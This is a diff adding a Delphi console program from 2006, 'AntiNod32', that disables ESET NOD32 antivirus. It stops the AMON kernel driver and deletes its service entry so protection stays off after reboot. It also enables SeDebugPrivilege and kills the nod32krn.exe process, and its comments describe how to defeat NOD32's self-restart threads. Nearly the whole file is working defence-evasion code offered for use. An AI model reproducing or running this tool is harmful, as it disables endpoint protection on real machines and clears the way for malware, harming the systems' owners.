@@ -1,0 +1,169 @@
+Program AntiNod32;
+{
+   NOD32 Disabler by FuXdas aka CyberPunk
+   13/09/2006
+   ---------------------------------------
+ 
+}
+
+{$APPTYPE CONSOLE}
+
+Uses Windows, TLHelp32, WinSvc;
+
+Const
+  Welcome = ' Coded by FuXdas ~ suicidale_dream@hotmail.com'+#13#10+
+            ' www.instinctcoders.com'+#13#10+#13#10+
+            ' WARNING!!, This Application demonstrate how disable NOD32 Protection.'+#13#10+
+            ' Source code is included, Tested on NOD32 NT version, '+#13#10+
+            ' Type yes if u want to disable NOD32 protection'+#13#10;
+
+  PROCESS_TERMINATE = $0001;
+  DrvName: PChar = 'AMON';  // Nod32 core Kernel Driver
+  SrvName: PChar = 'nod32krn.exe';
+
+//--- We will stop the nod driver with this function
+// Nod that it work like Services
+Function StopNodDriver(): Boolean;
+Var
+  SCManager, Service: SC_Handle;
+  ServiceStatus: TServiceStatus;
+Begin
+  Result := False;
+  SCManager := OpenSCManager(Nil, Nil, SC_MANAGER_CONNECT);
+  If SCManager = 0 Then Exit;
+  Try
+    Service := OpenService(SCManager, PChar(DrvName), SERVICE_STOP);
+    If ControlService(Service, SERVICE_CONTROL_STOP, ServiceStatus) Then
+      Result := True;
+    CloseServiceHandle(Service);
+  Finally
+    CloseServiceHandle(SCManager);
+  End;
+End;
+//Unregistring nod's driver
+// This will remove driver's keys from registry
+Function UnrNodDrv(): Boolean;
+Var
+  SCManager, Service: SC_Handle;
+Begin
+  Result := False;
+  SCManager := OpenSCManager(Nil, Nil, SC_MANAGER_CONNECT);
+  If SCManager = 0 Then Exit;
+  Try
+    Service := OpenService(SCManager, PChar(DrvName), STANDARD_RIGHTS_REQUIRED);
+    If Service <> 0 Then
+      If DeleteService(Service) Then
+        Result := True;
+    CloseServiceHandle(Service);
+  Finally
+    CloseServiceHandle(SCManager);
+  End;
+End;
+
+//- we will need some privilege
+procedure SetTokenPrivileges;
+var
+  hToken1, hToken2, hToken3: THandle;
+  TokenPrivileges: TTokenPrivileges;
+  Version: OSVERSIONINFO;
+begin
+  Version.dwOSVersionInfoSize := SizeOf(OSVERSIONINFO);
+  GetVersionEx(Version);
+  if Version.dwPlatformId <> VER_PLATFORM_WIN32_WINDOWS then
+  begin
+    try
+      OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES, hToken1);
+      hToken2 := hToken1;
+      LookupPrivilegeValue(nil, 'SeDebugPrivilege', TokenPrivileges.Privileges[0].luid);
+      TokenPrivileges.PrivilegeCount := 1;
+      TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
+      hToken3 := 0;
+      AdjustTokenPrivileges(hToken1, False, TokenPrivileges, 0, PTokenPrivileges(nil)^, hToken3);
+      TokenPrivileges.PrivilegeCount := 1;
+      TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
+      hToken3 := 0;
+      AdjustTokenPrivileges(hToken2, False, TokenPrivileges, 0, PTokenPrivileges(nil)^, hToken3);
+      CloseHandle(hToken1);
+    except;
+    end;
+  end;
+end;
+
+Function ExtractFileName(s: String): String;
+Var i, j: integer;
+Begin
+  j := 0;
+  For i := 1 To length(s) Do
+    If (s[i] = '\') Then j := i;
+  result := copy(s, j + 1, length(s));
+End;
+
+//--- Yeah killing Nod's services
+//After stoping Nod's driver we need to kill the service
+// And like this nod32krn.exe will need to load the driver, but can't because the driver is stoped
+//-- By the way after some research I have found that Nod injects 2 or 3 threads in 'services.exe'
+// and like this if killed, it will be restarted by the remote thread.
+// so if u want to completly kill nod's service u must kill the 2 threads in 'services.exe'
+Function KillNod32(): integer;
+Var
+  ContinueLoop: BOOL;
+  FSnapshotHandle: THandle;
+  FProcessEntry32: TProcessEntry32;
+Begin
+  result := 0;
+  SetTokenPrivileges;
+  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+  FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
+  ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
+  While integer(ContinueLoop) <> 0 Do
+  Begin
+    If (ExtractFileName(FProcessEntry32.szExeFile)) = SrvName Then
+      Result := Integer(TerminateProcess(OpenProcess(
+        PROCESS_TERMINATE, BOOL(0),
+        FProcessEntry32.th32ProcessID), 0));
+    ContinueLoop := Process32Next(FSnapshotHandle,
+      FProcessEntry32);
+  End;
+  CloseHandle(FSnapshotHandle);
+End;
+
+var
+  s:string;
+Begin
+//- yep just to demonstrate, )) u can remove all that shits
+///
+  WriteLn(welcome);
+  ReadLn(s);
+  If s = 'yes' then
+  Begin
+  //-- This one is the most important we must stop the driver
+  If StopNodDriver() Then
+    WriteLn(' Stoping Nod32 driver ok ')
+  Else
+  Begin
+    WriteLn(' Failed to stop Nod32 driver,any key to continue....');
+    Readln;
+  End;
+    //-- u can remove this function if u want that nod that start in the next boot
+    ///
+  If UnrNodDrv() Then
+    WriteLn(' Unregistring Nod32 driver ok')
+  Else
+  Begin
+    WriteLn(' Error while trying to Unregister Nod32 Driver,any key to continue...');
+    ReadLn;
+  End;
+  Asm
+     Call KillNod32 //;))
+     // After this the NOD's realtime protection will be disabled completly
+     // and we don't need a reboot
+     //- and if u use StopNodDriver() nod will be disabled also after the reb0ot
+     // So be carefull
+
+  End;
+end;
+readln
+// Cya FuXdas
+// contact: suicidale_dream@hotmail.com
+//          www.instinctcoders.com
+End.
